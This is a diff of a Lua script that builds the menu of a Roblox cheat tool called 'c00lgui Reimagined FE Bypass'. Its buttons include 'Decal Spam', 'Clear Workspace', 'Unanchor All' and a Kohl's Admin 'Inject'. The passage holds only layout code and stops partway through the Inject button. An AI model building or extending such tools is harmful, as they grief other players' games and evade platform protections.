@@ -1,0 +1,5097 @@
+-- Instances:
+
+local c00lgui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Page1 = Instance.new("Frame")
+local Btools = Instance.new("Frame")
+local TrollingGUI = Instance.new("TextButton")
+local Harked = Instance.new("TextButton")
+local RK1 = Instance.new("TextButton")
+local HarkinianGui = Instance.new("TextButton")
+local UnanchorAll = Instance.new("TextButton")
+local DecalSpam = Instance.new("TextButton")
+local Vector13 = Instance.new("TextButton")
+local ClearWorkspace = Instance.new("TextButton")
+local Empty = Instance.new("TextButton")
+local Empty_2 = Instance.new("TextButton")
+local Empty_3 = Instance.new("TextButton")
+local Empty_4 = Instance.new("TextButton")
+local Title = Instance.new("TextLabel")
+local Title_2 = Instance.new("TextLabel")
+local Settings = Instance.new("Frame")
+local Page1_2 = Instance.new("Frame")
+local BillboardGuiText = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local Title_3 = Instance.new("TextLabel")
+local _4nn1 = Instance.new("Frame")
+local Title_4 = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local BtoolsName = Instance.new("Frame")
+local Btools_2 = Instance.new("TextBox")
+local Title_5 = Instance.new("TextLabel")
+local DecalID = Instance.new("Frame")
+local TextBox_2 = Instance.new("TextBox")
+local Title_6 = Instance.new("TextLabel")
+local Title_7 = Instance.new("TextLabel")
+local Redwood = Instance.new("Frame")
+local Title_8 = Instance.new("TextLabel")
+local TextButton_2 = Instance.new("TextButton")
+local R6 = Instance.new("Frame")
+local Title_9 = Instance.new("TextLabel")
+local TextButton_3 = Instance.new("TextButton")
+local BakersValley = Instance.new("Frame")
+local Title_10 = Instance.new("TextLabel")
+local TextButton_4 = Instance.new("TextButton")
+local Car = Instance.new("Frame")
+local Title_11 = Instance.new("TextLabel")
+local TextButton_5 = Instance.new("TextButton")
+local TextButton_6 = Instance.new("TextButton")
+local TextButton_7 = Instance.new("TextButton")
+local SettingsButton = Instance.new("TextButton")
+local Title_12 = Instance.new("TextLabel")
+local Madeby = Instance.new("TextLabel")
+local TextButton_8 = Instance.new("TextButton")
+local TextButton_9 = Instance.new("TextButton")
+local Title_13 = Instance.new("TextLabel")
+local Page2 = Instance.new("Frame")
+local KohlsAdmin = Instance.new("Frame")
+local Inject = Instance.new("TextButton")
+local Title_14 = Instance.new("TextLabel")
+local cmds = Instance.new("TextBox")
+local ExecuteCmd = Instance.new("TextButton")
+local ExecuteFunction = Instance.new("TextButton")
+local functions = Instance.new("TextBox")
+local Title_15 = Instance.new("TextLabel")
+local SettingsButton_2 = Instance.new("TextButton")
+local CloseOpen = Instance.new("TextButton")
+
+--Properties:
+
+c00lgui.Name = "c00lgui"
+c00lgui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+c00lgui.ResetOnSpawn = false
+
+Frame.Parent = c00lgui
+Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Frame.BorderSizePixel = 3
+Frame.Position = UDim2.new(0, 3, 0.300000012, 0)
+Frame.Size = UDim2.new(0, 300, 0, 400)
+
+Page1.Name = "Page1"
+Page1.Parent = Frame
+Page1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Page1.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Page1.BorderSizePixel = 3
+Page1.Position = UDim2.new(0, 0, 0, 83)
+Page1.Size = UDim2.new(1, 0, 1, -106)
+Page1.ZIndex = 2
+
+Btools.Name = "Btools"
+Btools.Parent = Page1
+Btools.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Btools.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Btools.BorderSizePixel = 3
+Btools.Size = UDim2.new(1.00999999, -3, 1, 0)
+Btools.ZIndex = 2
+
+TrollingGUI.Name = "Trolling GUI"
+TrollingGUI.Parent = Btools
+TrollingGUI.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TrollingGUI.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TrollingGUI.BorderSizePixel = 3
+TrollingGUI.Position = UDim2.new(0, 0, 0, 33)
+TrollingGUI.Size = UDim2.new(0.5, 0, 0, 30)
+TrollingGUI.ZIndex = 2
+TrollingGUI.Font = Enum.Font.SourceSans
+TrollingGUI.Text = "Trolling GUI"
+TrollingGUI.TextColor3 = Color3.fromRGB(255, 255, 255)
+TrollingGUI.TextSize = 14.000
+
+Harked.Name = "Harked"
+Harked.Parent = Btools
+Harked.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Harked.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Harked.BorderSizePixel = 3
+Harked.Position = UDim2.new(0.5, 3, 0, 33)
+Harked.Size = UDim2.new(0.5, -3, 0, 30)
+Harked.ZIndex = 2
+Harked.Font = Enum.Font.SourceSans
+Harked.Text = "Harked"
+Harked.TextColor3 = Color3.fromRGB(255, 255, 255)
+Harked.TextSize = 14.000
+Harked.TextWrapped = true
+
+RK1.Name = "RK1"
+RK1.Parent = Btools
+RK1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+RK1.BorderColor3 = Color3.fromRGB(255, 0, 0)
+RK1.BorderSizePixel = 3
+RK1.Position = UDim2.new(0, 0, 0, 66)
+RK1.Size = UDim2.new(0.5, 0, 0, 30)
+RK1.ZIndex = 2
+RK1.Font = Enum.Font.SourceSans
+RK1.Text = "RK1"
+RK1.TextColor3 = Color3.fromRGB(255, 255, 255)
+RK1.TextSize = 14.000
+RK1.TextWrapped = true
+
+HarkinianGui.Name = "Harkinian Gui"
+HarkinianGui.Parent = Btools
+HarkinianGui.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+HarkinianGui.BorderColor3 = Color3.fromRGB(255, 0, 0)
+HarkinianGui.BorderSizePixel = 3
+HarkinianGui.Position = UDim2.new(0.5, 3, 0, 66)
+HarkinianGui.Size = UDim2.new(0.5, -3, 0, 30)
+HarkinianGui.ZIndex = 2
+HarkinianGui.Font = Enum.Font.SourceSans
+HarkinianGui.Text = "Harkinian GUI"
+HarkinianGui.TextColor3 = Color3.fromRGB(255, 255, 255)
+HarkinianGui.TextSize = 14.000
+HarkinianGui.TextWrapped = true
+
+UnanchorAll.Name = "Unanchor All"
+UnanchorAll.Parent = Btools
+UnanchorAll.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+UnanchorAll.BorderColor3 = Color3.fromRGB(255, 0, 0)
+UnanchorAll.BorderSizePixel = 3
+UnanchorAll.Position = UDim2.new(0, 0, 0, 99)
+UnanchorAll.Size = UDim2.new(0.499000013, 0, 0, 30)
+UnanchorAll.ZIndex = 2
+UnanchorAll.Font = Enum.Font.SourceSans
+UnanchorAll.Text = "Unanchor All"
+UnanchorAll.TextColor3 = Color3.fromRGB(255, 255, 255)
+UnanchorAll.TextSize = 14.000
+UnanchorAll.TextWrapped = true
+
+DecalSpam.Name = "Decal Spam"
+DecalSpam.Parent = Btools
+DecalSpam.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+DecalSpam.BorderColor3 = Color3.fromRGB(255, 0, 0)
+DecalSpam.BorderSizePixel = 3
+DecalSpam.Position = UDim2.new(0.5, 3, 0, 99)
+DecalSpam.Size = UDim2.new(0.5, -3, 0, 30)
+DecalSpam.ZIndex = 2
+DecalSpam.Font = Enum.Font.SourceSans
+DecalSpam.Text = "Decal Spam"
+DecalSpam.TextColor3 = Color3.fromRGB(255, 255, 255)
+DecalSpam.TextSize = 14.000
+
+Vector13.Name = "Vector13"
+Vector13.Parent = Btools
+Vector13.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Vector13.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Vector13.BorderSizePixel = 3
+Vector13.Position = UDim2.new(0, 0, 0, 132)
+Vector13.Size = UDim2.new(0.499000013, 0, 0, 30)
+Vector13.ZIndex = 2
+Vector13.Font = Enum.Font.SourceSans
+Vector13.Text = "Vector13"
+Vector13.TextColor3 = Color3.fromRGB(255, 255, 255)
+Vector13.TextSize = 14.000
+Vector13.TextWrapped = true
+
+ClearWorkspace.Name = "Clear Workspace"
+ClearWorkspace.Parent = Btools
+ClearWorkspace.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+ClearWorkspace.BorderColor3 = Color3.fromRGB(255, 0, 0)
+ClearWorkspace.BorderSizePixel = 3
+ClearWorkspace.Position = UDim2.new(0.5, 3, 0, 132)
+ClearWorkspace.Size = UDim2.new(0.5, -3, 0, 30)
+ClearWorkspace.ZIndex = 2
+ClearWorkspace.Font = Enum.Font.SourceSans
+ClearWorkspace.Text = "Clear Workspace"
+ClearWorkspace.TextColor3 = Color3.fromRGB(255, 255, 255)
+ClearWorkspace.TextSize = 14.000
+ClearWorkspace.TextWrapped = true
+
+Empty.Name = "Empty"
+Empty.Parent = Btools
+Empty.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Empty.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Empty.BorderSizePixel = 3
+Empty.Position = UDim2.new(0, 0, 0, 165)
+Empty.Size = UDim2.new(0.5, 0, 0, 30)
+Empty.ZIndex = 2
+Empty.Font = Enum.Font.SourceSans
+Empty.Text = "Empty"
+Empty.TextColor3 = Color3.fromRGB(255, 255, 255)
+Empty.TextSize = 14.000
+
+Empty_2.Name = "Empty"
+Empty_2.Parent = Btools
+Empty_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Empty_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Empty_2.BorderSizePixel = 3
+Empty_2.Position = UDim2.new(0.5, 3, 0, 165)
+Empty_2.Size = UDim2.new(0.5, -3, 0, 30)
+Empty_2.ZIndex = 2
+Empty_2.Font = Enum.Font.SourceSans
+Empty_2.Text = "Empty"
+Empty_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Empty_2.TextSize = 14.000
+
+Empty_3.Name = "Empty"
+Empty_3.Parent = Btools
+Empty_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Empty_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Empty_3.BorderSizePixel = 3
+Empty_3.Position = UDim2.new(0, 0, 0, 198)
+Empty_3.Size = UDim2.new(0.5, 0, 0, 30)
+Empty_3.ZIndex = 2
+Empty_3.Font = Enum.Font.SourceSans
+Empty_3.Text = "Empty"
+Empty_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+Empty_3.TextSize = 14.000
+Empty_3.TextWrapped = true
+
+Empty_4.Name = "Empty"
+Empty_4.Parent = Btools
+Empty_4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Empty_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Empty_4.BorderSizePixel = 3
+Empty_4.Position = UDim2.new(0.5, 3, 0, 198)
+Empty_4.Size = UDim2.new(0.49000001, 0, 0, 30)
+Empty_4.ZIndex = 2
+Empty_4.Font = Enum.Font.SourceSans
+Empty_4.Text = "Empty"
+Empty_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+Empty_4.TextSize = 14.000
+Empty_4.TextWrapped = true
+
+Title.Name = "Title"
+Title.Parent = Btools
+Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title.BorderSizePixel = 3
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.ZIndex = 2
+Title.Font = Enum.Font.SourceSansBold
+Title.Text = "Btools Destruction"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 14.000
+
+Title_2.Name = "Title"
+Title_2.Parent = Page1
+Title_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_2.BorderSizePixel = 3
+Title_2.Position = UDim2.new(-0.0011353048, 0, 0.897656918, 0)
+Title_2.Size = UDim2.new(1.00113535, 0, 0, 30)
+Title_2.ZIndex = 2
+Title_2.Font = Enum.Font.SourceSansBold
+Title_2.Text = "Page 1"
+Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_2.TextSize = 14.000
+
+Settings.Name = "Settings"
+Settings.Parent = Frame
+Settings.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Settings.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Settings.BorderSizePixel = 3
+Settings.Position = UDim2.new(1, 3, 0, 0)
+Settings.Size = UDim2.new(1, 0, 1, 0)
+
+Page1_2.Name = "Page1"
+Page1_2.Parent = Settings
+Page1_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Page1_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Page1_2.BorderSizePixel = 3
+Page1_2.Position = UDim2.new(0, 0, 0, 83)
+Page1_2.Size = UDim2.new(1, 0, 1, -83)
+
+BillboardGuiText.Name = "Billboard Gui Text"
+BillboardGuiText.Parent = Page1_2
+BillboardGuiText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+BillboardGuiText.BorderColor3 = Color3.fromRGB(255, 0, 0)
+BillboardGuiText.BorderSizePixel = 3
+BillboardGuiText.Position = UDim2.new(0.5, 3, 0, 198)
+BillboardGuiText.Size = UDim2.new(0.5, -3, 0, 63)
+BillboardGuiText.Visible = false
+
+TextBox.Parent = BillboardGuiText
+TextBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextBox.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextBox.BorderSizePixel = 3
+TextBox.Position = UDim2.new(0, 0, 0.5, 0)
+TextBox.Size = UDim2.new(0.99000001, 1, 0.5, -1)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 14.000
+
+Title_3.Name = "Title"
+Title_3.Parent = BillboardGuiText
+Title_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_3.BorderSizePixel = 3
+Title_3.Size = UDim2.new(1, 0, 0, 30)
+Title_3.Font = Enum.Font.SourceSansBold
+Title_3.Text = "Billboard Gui Text"
+Title_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_3.TextSize = 14.000
+Title_3.TextWrapped = true
+
+_4nn1.Name = "4nn1"
+_4nn1.Parent = Page1_2
+_4nn1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+_4nn1.BorderColor3 = Color3.fromRGB(255, 0, 0)
+_4nn1.BorderSizePixel = 3
+_4nn1.Position = UDim2.new(0, 0, 0, 66)
+_4nn1.Size = UDim2.new(0.5, 0, 0, 63)
+
+Title_4.Name = "Title"
+Title_4.Parent = _4nn1
+Title_4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_4.BorderSizePixel = 3
+Title_4.Size = UDim2.new(1, 0, 0, 30)
+Title_4.Font = Enum.Font.SourceSansBold
+Title_4.Text = "4nn1"
+Title_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_4.TextSize = 14.000
+
+TextButton.Parent = _4nn1
+TextButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextButton.BorderSizePixel = 3
+TextButton.Position = UDim2.new(0, 0, 0.5, 0)
+TextButton.Size = UDim2.new(0.99000001, 1, 0.5, -1)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Execute"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextSize = 14.000
+
+BtoolsName.Name = "Btools Name"
+BtoolsName.Parent = Page1_2
+BtoolsName.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+BtoolsName.BorderColor3 = Color3.fromRGB(255, 0, 0)
+BtoolsName.BorderSizePixel = 3
+BtoolsName.Position = UDim2.new(0.5, 3, 0, 0)
+BtoolsName.Size = UDim2.new(0.5, -3, 0, 63)
+
+Btools_2.Name = "Btools"
+Btools_2.Parent = BtoolsName
+Btools_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Btools_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Btools_2.BorderSizePixel = 3
+Btools_2.Position = UDim2.new(0, 0, 0.5, 0)
+Btools_2.Size = UDim2.new(0.99000001, 1, 0.5, -1)
+Btools_2.Font = Enum.Font.SourceSans
+Btools_2.Text = "Building Tools"
+Btools_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Btools_2.TextSize = 14.000
+
+Title_5.Name = "Title"
+Title_5.Parent = BtoolsName
+Title_5.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_5.BorderSizePixel = 3
+Title_5.Size = UDim2.new(1, 0, 0, 30)
+Title_5.Font = Enum.Font.SourceSansBold
+Title_5.Text = "F3X/Btools Name"
+Title_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_5.TextSize = 14.000
+
+DecalID.Name = "Decal ID"
+DecalID.Parent = Page1_2
+DecalID.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+DecalID.BorderColor3 = Color3.fromRGB(255, 0, 0)
+DecalID.BorderSizePixel = 3
+DecalID.Size = UDim2.new(0.5, 0, 0, 63)
+
+TextBox_2.Parent = DecalID
+TextBox_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextBox_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextBox_2.BorderSizePixel = 3
+TextBox_2.Position = UDim2.new(0, 0, 0.5, 0)
+TextBox_2.Size = UDim2.new(0.99000001, 1, 0.5, -1)
+TextBox_2.Font = Enum.Font.SourceSans
+TextBox_2.Text = "433517917"
+TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox_2.TextSize = 14.000
+
+Title_6.Name = "Title"
+Title_6.Parent = DecalID
+Title_6.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_6.BorderSizePixel = 3
+Title_6.Size = UDim2.new(1, 0, 0, 30)
+Title_6.Font = Enum.Font.SourceSansBold
+Title_6.Text = "Decal ID"
+Title_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_6.TextSize = 14.000
+
+Title_7.Name = "Title"
+Title_7.Parent = Page1_2
+Title_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_7.BorderSizePixel = 3
+Title_7.Position = UDim2.new(0, 0, 0.831689894, 0)
+Title_7.Size = UDim2.new(0.998433411, 0, 0, 30)
+Title_7.ZIndex = 2
+Title_7.Font = Enum.Font.SourceSansBold
+Title_7.Text = "Page 1"
+Title_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_7.TextSize = 14.000
+
+Redwood.Name = "Redwood"
+Redwood.Parent = Page1_2
+Redwood.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Redwood.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Redwood.BorderSizePixel = 3
+Redwood.Position = UDim2.new(0, 153, 0, 66)
+Redwood.Size = UDim2.new(0.488433421, 0, 0, 63)
+
+Title_8.Name = "Title"
+Title_8.Parent = Redwood
+Title_8.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_8.BorderSizePixel = 3
+Title_8.Size = UDim2.new(1, 0, 0, 30)
+Title_8.Font = Enum.Font.SourceSansBold
+Title_8.Text = "Redwood Prison"
+Title_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_8.TextSize = 14.000
+
+TextButton_2.Parent = Redwood
+TextButton_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextButton_2.BorderSizePixel = 3
+TextButton_2.Position = UDim2.new(2.08268418e-07, 0, 0.5, 0)
+TextButton_2.Size = UDim2.new(0.989841998, 1, 0.5, -1)
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "Execute"
+TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_2.TextSize = 14.000
+
+R6.Name = "R6"
+R6.Parent = Page1_2
+R6.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+R6.BorderColor3 = Color3.fromRGB(255, 0, 0)
+R6.BorderSizePixel = 3
+R6.Position = UDim2.new(0, 0, 0, 198)
+R6.Size = UDim2.new(0.5, 0, 0, 63)
+
+Title_9.Name = "Title"
+Title_9.Parent = R6
+Title_9.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_9.BorderSizePixel = 3
+Title_9.Position = UDim2.new(0, 0, -0.0476190485, 0)
+Title_9.Size = UDim2.new(1, 0, 0.0476190485, 30)
+Title_9.Font = Enum.Font.SourceSansBold
+Title_9.Text = "R6"
+Title_9.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_9.TextSize = 14.000
+
+TextButton_3.Parent = R6
+TextButton_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextButton_3.BorderSizePixel = 3
+TextButton_3.Position = UDim2.new(0, 0, 0.5, 0)
+TextButton_3.Size = UDim2.new(0.99000001, 1, 0.5, -1)
+TextButton_3.Font = Enum.Font.SourceSans
+TextButton_3.Text = "Execute"
+TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_3.TextSize = 14.000
+
+BakersValley.Name = "Bakers Valley"
+BakersValley.Parent = Page1_2
+BakersValley.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+BakersValley.BorderColor3 = Color3.fromRGB(255, 0, 0)
+BakersValley.BorderSizePixel = 3
+BakersValley.Position = UDim2.new(0, 153, 0, 129)
+BakersValley.Size = UDim2.new(0.48680532, 0, 0, 63)
+
+Title_10.Name = "Title"
+Title_10.Parent = BakersValley
+Title_10.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title_10.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_10.BorderSizePixel = 3
+Title_10.Size = UDim2.new(0.999999762, 0, 0, 30)
+Title_10.Font = Enum.Font.SourceSansBold
+Title_10.Text = "Bakers Valley"
+Title_10.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_10.TextSize = 14.000
+
+TextButton_4.Parent = BakersValley
+TextButton_4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextButton_4.BorderSizePixel = 3
+TextButton_4.Position = UDim2.new(0, 0, 0.5, 0)
+TextButton_4.Size = UDim2.new(0.989819109, 1, 0.5, -1)
+TextButton_4.Font = Enum.Font.SourceSans
+TextButton_4.Text = "Execute"
+TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_4.TextSize = 14.000
+
+Car.Name = "Car"
+Car.Parent = Page1_2
+Car.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Car.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Car.BorderSizePixel = 3
+Car.Position = UDim2.new(0, 0, 0, 129)
+Car.Size = UDim2.new(0.5, 0, 0, 63)
+
+Title_11.Name = "Title"
+Title_11.Parent = Car
+Title_11.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title_11.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_11.BorderSizePixel = 3
+Title_11.Size = UDim2.new(1, 0, 0, 30)
+Title_11.Font = Enum.Font.SourceSansBold
+Title_11.Text = "Car Games"
+Title_11.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_11.TextSize = 14.000
+
+TextButton_5.Parent = Car
+TextButton_5.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextButton_5.BorderSizePixel = 3
+TextButton_5.Position = UDim2.new(0, 0, 0.5, 0)
+TextButton_5.Size = UDim2.new(0.99000001, 1, 0.5, -1)
+TextButton_5.Font = Enum.Font.SourceSans
+TextButton_5.Text = "Execute"
+TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_5.TextSize = 14.000
+
+TextButton_6.Name = ">"
+TextButton_6.Parent = Settings
+TextButton_6.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextButton_6.BorderSizePixel = 3
+TextButton_6.Position = UDim2.new(0.5, 3, 0, 40)
+TextButton_6.Size = UDim2.new(0.5, -3, 0, 40)
+TextButton_6.Font = Enum.Font.SourceSans
+TextButton_6.Text = ">"
+TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_6.TextSize = 48.000
+
+TextButton_7.Name = "<"
+TextButton_7.Parent = Settings
+TextButton_7.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextButton_7.BorderSizePixel = 3
+TextButton_7.Position = UDim2.new(0, 0, 0, 40)
+TextButton_7.Size = UDim2.new(0.5, 0, 0, 40)
+TextButton_7.Font = Enum.Font.SourceSans
+TextButton_7.Text = "<"
+TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_7.TextSize = 48.000
+
+SettingsButton.Name = "SettingsButton"
+SettingsButton.Parent = Settings
+SettingsButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+SettingsButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
+SettingsButton.BorderSizePixel = 3
+SettingsButton.Position = UDim2.new(1, 3, 0, 0)
+SettingsButton.Size = UDim2.new(0, 27, 1, 0)
+SettingsButton.Font = Enum.Font.SourceSans
+SettingsButton.Text = "<"
+SettingsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+SettingsButton.TextSize = 48.000
+
+Title_12.Name = "Title"
+Title_12.Parent = Settings
+Title_12.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title_12.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_12.BorderSizePixel = 3
+Title_12.Size = UDim2.new(1, 0, 0, 40)
+Title_12.Font = Enum.Font.SourceSans
+Title_12.Text = "Settings"
+Title_12.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_12.TextSize = 24.000
+
+Madeby.Name = "Made by"
+Madeby.Parent = Settings
+Madeby.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Madeby.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Madeby.BorderSizePixel = 3
+Madeby.Position = UDim2.new(-0.0133333337, 3, 0, 380)
+Madeby.Size = UDim2.new(0, 301, 0, 20)
+Madeby.ZIndex = 3
+Madeby.Font = Enum.Font.SourceSans
+Madeby.Text = "Made by rusello25"
+Madeby.TextColor3 = Color3.fromRGB(255, 255, 255)
+Madeby.TextSize = 18.000
+
+TextButton_8.Name = ">"
+TextButton_8.Parent = Frame
+TextButton_8.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextButton_8.BorderSizePixel = 3
+TextButton_8.Position = UDim2.new(0.5, 3, 0, 40)
+TextButton_8.Size = UDim2.new(0.5, -3, 0, 40)
+TextButton_8.ZIndex = 2
+TextButton_8.Font = Enum.Font.SourceSans
+TextButton_8.Text = ">"
+TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_8.TextSize = 48.000
+
+TextButton_9.Name = "<"
+TextButton_9.Parent = Frame
+TextButton_9.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TextButton_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextButton_9.BorderSizePixel = 3
+TextButton_9.Position = UDim2.new(0, 0, 0, 40)
+TextButton_9.Size = UDim2.new(0.5, -3, 0, 40)
+TextButton_9.ZIndex = 2
+TextButton_9.Font = Enum.Font.SourceSans
+TextButton_9.Text = "<"
+TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_9.TextSize = 48.000
+
+Title_13.Name = "Title"
+Title_13.Parent = Frame
+Title_13.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title_13.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_13.BorderSizePixel = 3
+Title_13.Size = UDim2.new(1, 0, 0, 40)
+Title_13.ZIndex = 2
+Title_13.Font = Enum.Font.SourceSans
+Title_13.Text = "c00lgui Reimagined FE Bypass"
+Title_13.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_13.TextSize = 24.000
+
+Page2.Name = "Page2"
+Page2.Parent = Frame
+Page2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Page2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Page2.BorderSizePixel = 3
+Page2.Position = UDim2.new(0, 0, 0, 83)
+Page2.Size = UDim2.new(1, 0, 1, -106)
+Page2.Visible = false
+Page2.ZIndex = 2
+
+KohlsAdmin.Name = "Kohl's Admin"
+KohlsAdmin.Parent = Page2
+KohlsAdmin.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+KohlsAdmin.BorderColor3 = Color3.fromRGB(255, 0, 0)
+KohlsAdmin.BorderSizePixel = 3
+KohlsAdmin.Size = UDim2.new(1.00999999, -3, 1, 0)
+KohlsAdmin.ZIndex = 2
+
+Inject.Name = "Inject"
+Inject.Parent = KohlsAdmin
+Inject.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Inject.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Inject.BorderSizePixel = 3
